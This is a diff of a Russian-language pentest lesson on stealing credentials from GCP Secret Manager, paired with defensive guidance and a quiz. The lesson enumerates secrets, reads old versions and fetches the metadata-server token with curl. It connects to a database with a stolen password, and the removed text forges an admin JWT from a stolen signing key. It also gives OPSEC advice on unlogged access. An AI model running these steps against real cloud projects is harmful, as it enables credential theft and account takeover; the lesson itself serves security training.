@@ -14,207 +14,248 @@ useful_for:
 estimated_minutes: 45
 summary: "Secret Manager: версии, права secretmanager.versions.access, IAM на уровне секрета, CMEK и audit-логи. Как найти и прочитать секреты при слабых правах."
 ---
+## Задача
 
-## Зачем этот урок
+Мы разбирали секреты в CI и state. Теперь — централизованное хранилище секретов GCP: **Secret Manager**. Идея сервиса благая: секреты лежат не в коде, а в защищённом хранилище, и приложение берёт их по имени. Задача: показать, как при слабых правах секреты из него вытаскиваются. Разберём на конкретном GCP-проекте.
 
-Secret Manager — централизованное хранилище секретов в GCP: пароли баз, API-ключи, токены, приватные ключи. В отличие от «секретов в переменных окружения», он даёт версионирование и IAM. Но именно из-за централизации он становится точкой максимального риска: одна роль с `secretmanager.versions.access` на `*` раскрывает весь проект. Атакующего интересуют: перечисление секретов, чтение версий, старые версии (иногда с более слабыми секретами) и audit-логи, показывающие, кто ещё их читает.
+## Данные: проект и наши права
 
-## Модель Secret Manager
+У нас есть service-account или пользовательский доступ к проекту `acme-prod`. Смотрим, какие секреты вообще есть:
 
-- **Secret** — контейнер с метаданными (метки, rotation, CMEK).
-- **Version** — конкретное значение секрета; версии иммутабельны. Есть `latest` и номерные версии, а также состояния (ENABLED/DISABLED/DESTROYED).
-- **IAM** — права на уровне проекта, секрета или версии: `roles/secretmanager.secretAccessor` (читать значение), `roles/secretmanager.viewer` (метаданные), `roles/secretmanager.admin` (управление).
-- **CMEK** — секрет может шифроваться ключом KMS; чтение требует прав на ключ.
-- **Rotation** — автоматическая ротация через Cloud Functions/Pub-Sub; старые версии остаются доступными.
-- **Audit** — Cloud Audit Logs пишут `AccessSecretVersion`.
-
-Ключевые права: `secretmanager.secrets.list`, `secretmanager.secrets.get`, `secretmanager.versions.access`, `secretmanager.versions.list`.
-
-## Инструменты и команды
-
-```bash
-# Перечисление
-gcloud secrets list --project PROJECT_ID
-gcloud secrets versions list db-password --project PROJECT_ID
-
-# Метаданные
-gcloud secrets describe db-password --format=json | jq '{replication,labels,rotation}'
-
-# Чтение значения
-gcloud secrets versions access latest --secret=db-password --project PROJECT_ID
-gcloud secrets versions access 1 --secret=db-password   # старая версия
-
-# Через REST с токеном
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets?pageSize=100" \
-  | jq -r '.secrets[].name'
-
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://secretmanager.googleapis.com/v1/projects/PROJECT_ID/secrets/db-password/versions/latest:access" \
-  | jq -r .payload.data | base64 -d
-
-# IAM секрета
-gcloud secrets get-iam-policy db-password
+```
+$ gcloud secrets list --project acme-prod --format='table(name,createTime)'
+NAME                CREATE_TIME
+db-password         2025-01-10T10:00:00Z
+api-signing-key     2025-02-02T12:30:00Z
+stripe-secret       2025-03-01T09:15:00Z
 ```
 
-## Разобранный пример: от list к чтению всех секретов
+`gcloud secrets list` — перечисление секретов. Имён достаточно, чтобы понять, за чем охотиться. Но чтобы **прочитать значение**, нужно право `secretmanager.versions.access`.
 
-Сценарий: у роли есть `roles/secretmanager.viewer` (видит метаданные) и `secretmanager.versions.access` на один секрет. Но часто роли дают шире.
+## Пробуем в лоб: пробуем прочитать
 
-```bash
-gcloud secrets list --format='value(name)'
-# db-password
-# stripe-key
-# jwt-signing-key
-# sendgrid-api
+Пробуем получить последнюю версию секрета:
 
-for s in db-password stripe-key jwt-signing-key sendgrid-api; do
-  echo "== $s =="
-  gcloud secrets versions access latest --secret="$s" 2>/dev/null | head -c 80; echo
-done
-# == db-password ==
-# S3cr3t-Pr0d-!
-# == stripe-key ==
-# sk_live_51H8...
-# == jwt-signing-key ==
-# -----BEGIN PRIVATE KEY-----
-# == sendgrid-api ==
-# SG.xxxx
+```
+$ gcloud secrets versions access latest --secret=db-password --project acme-prod
+Pr0d-DB-P@ss
 ```
 
-За один проход получили пароль БД, платёжный ключ, ключ подписи JWT (позволяет подделывать токены) и ключ рассылок. Ключ подписи JWT особенно ценен: с ним можно выпустить токен администратора.
+Сработало. Значит, у нашего принципала есть `secretmanager.versions.access` — либо на уровне проекта, либо на конкретном секрете. Это ключевой момент: **доступ к секретам выдаётся по IAM, и его легко перевыдать**.
 
-## IAM на уровне секрета и версии
+## Приём: перечисляем все версии и читаем
 
-Права можно выдавать точечно: на конкретный секрет (`projects/P/secrets/db-password`) или даже на версию. Это значит:
+Секрет — это контейнер, у которого есть **версии** (versions). Старые версии часто остаются и содержат предыдущие (тоже валидные или «резервные») пароли. Перечисляем версии:
 
-- Проверяйте, нет ли у вашей роли доступа к секретам с «интересными» именами (`prod`, `admin`, `signing`, `api`).
-- Проверяйте старые версии: иногда секрет ротировали, но старая версия осталась с более привилегированным значением.
-- Проверяйте `DISABLED`/`DESTROYED` версии: `DESTROYED` прочитать нельзя, `DISABLED` — иногда да (если есть права).
-- Смотрите метки (`labels`): они указывают, какой сервис использует секрет.
-
-## Audit-логи и слепые зоны
-
-`AccessSecretVersion` пишется в Cloud Audit Logs (data access). Проверьте:
-
-```bash
-gcloud logging read 'protoPayload.methodName="google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion"' \
-  --limit 20 --format='table(timestamp, protoPayload.authenticationInfo.principalEmail, protoPayload.resourceName)'
+```
+$ gcloud secrets versions list db-password --project acme-prod --format='table(name,state)'
+NAME  STATE
+3     ENABLED
+2     ENABLED
+1     DISABLED
 ```
 
-Из логов видно, кто и когда читал секреты. Это полезно и защитнику (детект), и атакующему (понять, какие сервисные аккаунты имеют доступ и как выглядит «нормальный» паттерн). Заметьте: `ListSecrets` — это admin activity и логируется всегда; `AccessSecretVersion` — data access, может быть выключен.
+Версия 2 всё ещё `ENABLED` — читаем и её:
 
-## Обход защит и edge cases
-
-- **CMEK.** Если секрет зашифрован собственным ключом, нужен `cloudkms.cryptoKeyVersions.useToDecrypt`. Иначе — `AccessDenied`.
-- **VPC-SC.** Периметр может блокировать доступ извне; нужен пивот внутри проекта.
-- **Data access logging off.** Если `AccessSecretVersion` не логируется, чтение секретов невидимо — идеально для OPSEC.
-- **Replication.** Секрет может реплицироваться в другой регион; политики могут отличаться.
-- **Rotation.** При ротации старая версия остаётся; если приложение ещё её использует, секрет «протекает» дольше.
-
-## Частые ошибки и подводные камни
-
-- Путать `secretmanager.viewer` (метаданные) и `secretAccessor` (значение).
-- Не проверить старые версии.
-- Игнорировать IAM на уровне секрета: роль может не иметь доступа к проекту, но иметь к секрету.
-- Забыть про CMEK при чтении.
-- Считать, что раз data access логи выключены, то «никто не узнает» — но admin activity (создание/удаление секретов) пишется всегда.
-
-## Защита и детект
-
-- Least privilege: `secretAccessor` на конкретные секреты, не на проект.
-- Включить CMEK и ограничить доступ к ключу.
-- Включить data access logging и алертить на массовые `AccessSecretVersion`.
-- Настроить rotation и удалять старые версии, которые больше не нужны.
-- Разделять секреты по средам (prod/dev) и проектам.
-
-## Модель угроз и типовые мисконфиги
-
-Типичный мисконфиг — `secretAccessor` на проект. Второй — секреты без CMEK. Третий — старые версии с привилегированными значениями. Четвёртый — выключенный data access logging. Пятый — секреты с «угадываемыми» именами без ограничений. Все они ведут к краже ключей.
-
-## Практическое задание
-
-1. Создайте секрет с двумя версиями; прочитайте обе.
-2. Выдайте роль `secretAccessor` только на один секрет и проверьте, что другой недоступен.
-3. Включите data access logging и найдите свои `AccessSecretVersion`.
-4. Включите CMEK и проверьте, что без прав на ключ чтение падает.
-
-## Что дальше / решение
-
-Из Secret Manager достаём ключи, пароли и приватные ключи. Дальше — использовать их (подделка JWT, доступ к БД, API). Зафиксируйте путь «секрет → значение → эскалация» в графе. При CMEK без прав — `blocked`. Особое внимание — ключам подписи: они дают долгоживущий доступ.
-
-## Разобранный пример 2: ключ подписи JWT и подделка токена
-
-Самый опасный секрет в проекте — ключ подписи токенов. Если у приложения есть секрет `jwt-signing-key` с приватным ключом, атакующий может выпустить токен администратора.
-
-```bash
-gcloud secrets versions access latest --secret=jwt-signing-key > /tmp/sign.pem
-head -1 /tmp/sign.pem
-# -----BEGIN PRIVATE KEY-----
-
-# Формируем поддельный JWT
-python3 - <<'PY'
-import jwt, time
-key = open('/tmp/sign.pem').read()
-tok = jwt.encode({'sub':'admin','role':'admin','exp':int(time.time())+3600}, key, algorithm='RS256')
-print(tok)
-PY
-# eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9....
-
-# Используем токен против API
-curl -s -H "Authorization: Bearer eyJhbGciOi..." https://api.example.com/admin/users
-# {"users":[...]}
+```
+$ gcloud secrets versions access 2 --secret=db-password --project acme-prod
+Pr0d-DB-P@ss-OLD
 ```
 
-Так секрет превращается в полный контроль над приложением без единого пароля. По этой причине ключи подписи должны храниться в HSM/KMS (asymmetric signing), а не в виде PEM-секрета: тогда приватный ключ нельзя экспортировать, а подпись делается через `asymmetricSign`. Если вы нашли именно PEM — считайте приложение скомпрометированным.
+Зачем: старый пароль может работать дольше, чем кажется, — его забыли ротировать на стороне БД. Плюс он даёт подсказку о шаблоне паролей.
 
-## Практическое задание
+Читаем остальные:
 
-1. Создайте секрет с приватным ключом и подпишите тестовый JWT.
-2. Проверьте токен на локальном сервисе, использующем тот же ключ.
-3. Замените ключ на KMS-версию (asymmetricSign) и убедитесь, что приватный ключ не экспортируется.
-4. Включите data access logging и найдите чтение секрета.
+```
+$ for s in api-signing-key stripe-secret; do echo "== $s"; gcloud secrets versions access latest --secret=$s; done
+== api-signing-key
+-----BEGIN PRIVATE KEY-----
+...
+== stripe-secret
+sk_live_51H...
+```
+
+## Полный прогон: от списка до компрометации
+
+1. **Разведка.** `secrets list` → имена секретов.
+2. **Права.** Проверяем, что можем читать: `versions access latest`.
+3. **Версии.** `versions list` → читаем старые ENABLED-версии.
+4. **Использование.** Пароль БД → подключение к базе; `stripe_secret` → платежи; signing key → подделка токенов.
+5. **Эскалация.** Часто в секретах лежат креды с более широкими правами. Проверяем:
+
+```
+$ gcloud secrets versions access latest --secret=db-password > /tmp/db
+$ psql "host=prod-db.abc.internal user=admin password=$(cat /tmp/db)" -c '\du'
+```
+
+## IAM на уровне секрета
+
+Доступ к Secret Manager выдаётся двумя способами: на уровне **проекта** (всем секретам) и на уровне **конкретного секрета**. Смотрим, кому что разрешено:
+
+```
+$ gcloud secrets get-iam-policy db-password --project acme-prod
+bindings:
+- members:
+  - serviceAccount:app-sa@acme-prod.iam.gserviceaccount.com
+  role: roles/secretmanager.secretAccessor
+```
+
+`secretAccessor` на конкретном секрете — правильная практика. Плохая — когда роль выдана на весь проект или на `allAuthenticatedUsers`:
+
+```
+$ gcloud projects get-iam-policy acme-prod --flatten='bindings[].members' \
+    --filter='bindings.role:secretmanager' --format='table(bindings.role,bindings.members)'
+ROLE                             MEMBERS
+roles/secretmanager.secretAccessor  allAuthenticatedUsers
+```
+
+`allAuthenticatedUsers` — любой, кто прошёл аутентификацию в Google, читает все секреты проекта. Это катастрофа.
+
+## CMEK, аудит и ротация
+
+- **CMEK** (Customer-Managed Encryption Key) — секрет шифруется ключом KMS, который вы контролируете. Не мешает чтению через IAM, но даёт возможность «отозвать» данные, удалив ключ.
+- **Audit logs** — каждое `versions.access` пишется в Cloud Audit Logs. Атакующий оставляет след; защита это видит (см. `cloud-logging-detection`).
+- **Ротация** — секреты надо регулярно менять; старые версии — `DISABLED`/удалять.
+- **Replication** — секрет реплицируется в регионы; проверяйте, нет ли копии в «слабом» регионе.
+
+## Секреты в других местах GCP
+
+Secret Manager — не единственное хранилище. Прежде чем сдаваться, проверьте:
+
+- **Instance metadata.** На VM сервисный аккаунт отдаёт токен через `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (см. `cloud-gcp-metadata`). С этим токеном — тот же `gcloud secrets access`.
+- **Cloud Storage.** Секреты в бакетах: `gsutil ls`, `gsutil cat`.
+- **Firestore/Firebase.** Открытые правила отдают данные (см. `cloud-gcp-firebase`).
+- **Cloud Functions / Cloud Run.** Переменные окружения функций содержат креды.
+- **App Engine / Config.** `gcloud app describe` и конфиги.
+
+```
+$ curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token
+ya29....
+```
+
+Тот же токен открывает Secret Manager — часто это и есть кратчайший путь к секретам.
+
+## Защита и что ломает атаку
+
+- **Роль на конкретный секрет**, а не на проект.
+- **Убрать `allAuthenticatedUsers`/`allUsers`** из IAM.
+- **CMEK** + права на KMS-ключ отдельно.
+- **Аудит** `secretmanager.versions.access` и алерты на аномалии.
+- **Ротация** и отключение старых версий.
+
+## Если не сработало
+
+- **Нет `secretmanager.versions.access`** — читать нечего; ищем другой принципал (сервисный аккаунт пода, CI).
+- **`allUsers` убран, роли узкие** — переходим к поиску секретов в других местах (env, state, CI).
+- **CMEK-ключ недоступен** — данные не расшифровать.
+- **Аудит включён** — активность заметна; учитываем OPSEC.
+
+## Мини-сценарий: чтение секрета целиком
+
+1. **Список.** `gcloud secrets list --project acme-prod` → `db-password`, `api-signing-key`, `stripe-secret`.
+2. **Чтение latest.** `gcloud secrets versions access latest --secret=db-password` → `Pr0d-DB-P@ss`. Право есть.
+3. **Старые версии.** `gcloud secrets versions list db-password` → версия 2 `ENABLED`; читаем и её → `Pr0d-DB-P@ss-OLD`.
+4. **IAM.** `gcloud secrets get-iam-policy db-password` → `app-sa@...` имеет `secretAccessor`. Проверяем проект: `get-iam-policy acme-prod` → `allAuthenticatedUsers` с той же ролью.
+5. **Использование.** `psql` с паролем БД → доступ к базе; `stripe-secret` → платежи.
+6. **Аудит.** В Cloud Audit Logs — событие `secretmanager.versions.access` на наш принципал.
+
+Доступ к секретам держится на IAM: одна широкая привязка открывает всё.
+
+## Что мы теперь знаем
+
+1. Secret Manager хранит секреты с версиями.
+2. Чтение требует `secretmanager.versions.access`.
+3. IAM можно выдать на проект или на конкретный секрет.
+4. `allAuthenticatedUsers` = утечка всех секретов.
+5. Аудит и CMEK — контроли; старые версии надо отключать.
+6. Тот же доступ к секретам часто открывается через metadata-токен VM.
+
+Главная мысль: Secret Manager — это надёжное хранилище, но его IAM легко сделать слишком широким.
+
+## Частые ошибки
+
+- **`allAuthenticatedUsers` в роли `secretAccessor`** — секреты доступны всем.
+- **Роль выдана на весь проект**, а не на конкретный секрет.
+- **Старые версии не отключены** — забытые пароли продолжают работать.
+- **Нет CMEK/аудита** — нет контроля и видимости доступа.
+- **Metadata-токен SA открывает Secret Manager** без доп. проверок.
+
+## На что смотреть дальше
+
+- `gcloud secrets list` — какие секреты есть.
+- `versions access latest`/`N` — доступ и старые версии.
+- `get-iam-policy` секрета и проекта — кому разрешено чтение.
+- Наличие `allAuthenticatedUsers`/`allUsers`.
+- CMEK и настройки аудита.
+
+## Быстрая проверка
+
+Три команды показывают, насколько открыт Secret Manager:
+
+```bash
+gcloud secrets list --project acme-prod
+gcloud secrets versions access latest --secret=db-password --project acme-prod
+gcloud projects get-iam-policy acme-prod --filter='bindings.role:secretmanager'
+```
+
+Если вторая команда вернула значение, а третья — `allAuthenticatedUsers`, проект открыт всем.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какое право раскрывает значение секрета?"
+- question: "Какое право нужно для чтения значения секрета в GCP?"
   options:
     - "secretmanager.versions.access"
-    - "secretmanager.secrets.list"
-    - "secretmanager.secrets.get"
-    - "resourcemanager.projects.get"
+    - "secretmanager.versions.list"
+    - "storage.objects.get"
+    - "iam.roles.list"
   answer: 0
-  explanation: "versions.access возвращает payload; list/get — только метаданные."
-- question: "Почему старые версии секрета опасны?"
+  explanation: "Значение версии читается через versions.access."
+- question: "Что такое версии секрета?"
   options:
-    - "Они могут содержать прежнее привилегированное значение"
-    - "Они не читаются"
-    - "Они удаляются автоматически"
-    - "Они публичны"
+    - "Исторические значения секрета, часть остаётся включённой"
+    - "Копии секрета в других проектах"
+    - "Права на секрет"
+    - "Регионы хранения"
   answer: 0
-  explanation: "Ротация не удаляет старые версии; там может остаться старый ключ."
-- question: "Что нужно для чтения секрета с CMEK?"
+  explanation: "Каждое обновление создаёт версию."
+- question: "Почему allAuthenticatedUsers в роли secretAccessor опасен?"
   options:
-    - "Права на KMS-ключ (useToDecrypt)"
-    - "Только versions.access"
-    - "Токен OAuth"
+    - "Любой аутентифицированный пользователь Google читает все секреты"
+    - "Он ускоряет доступ"
+    - "Он шифрует секреты"
+    - "Он блокирует чтение"
+  answer: 0
+  explanation: "Это делает секреты доступными всем."
+- question: "Как правильно выдавать доступ к секрету?"
+  options:
+    - "Роль secretAccessor на конкретный секрет"
+    - "Роль на весь проект"
+    - "allUsers на секрет"
+    - "Никак"
+  answer: 0
+  explanation: "Минимум прав — роль на конкретный ресурс."
+- question: "Что пишется в Cloud Audit Logs при чтении секрета?"
+  options:
+    - "Событие secretmanager.versions.access"
     - "Ничего"
+    - "Только вход в консоль"
+    - "Только ошибки"
   answer: 0
-  explanation: "CMEK-шифрование требует расшифровки ключом KMS."
-- question: "Какой метод всегда логируется (admin activity)?"
-  options:
-    - "ListSecrets"
-    - "AccessSecretVersion"
-    - "GetObject"
-    - "Scan"
-  answer: 0
-  explanation: "Admin activity логируется всегда; data access (AccessSecretVersion) — опционально."
+  explanation: "Доступ к секрету аудируется."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-gitlab-ci`) мы вернёмся к CI и разберём раннеры и переменные GitLab подробнее. А пока главное: централизованное хранилище секретов защищено ровно настолько, насколько узко выданы права IAM.
 
 ## Где пригодится
 
-- **Пентест GCP:** кража секретов проекта.
-- **Red team:** получение ключей подписи и API.
-- **Cloud IR:** аудит доступа к секретам.
-- **Сертификация:** Google Cloud Security.
+- **Bug bounty:** проекты с широкими правами на Secret Manager.
+- **Red team:** от чтения секретов к БД и платежам.
+- **Пентест:** аудит IAM GCP и секретов.
+- **Работа/DevSecOps:** роли на конкретный секрет, CMEK, аудит, ротация.
+- **Дальше по дереву:** `cloud-secrets-manager`, `cloud-secrets-sprawl`.
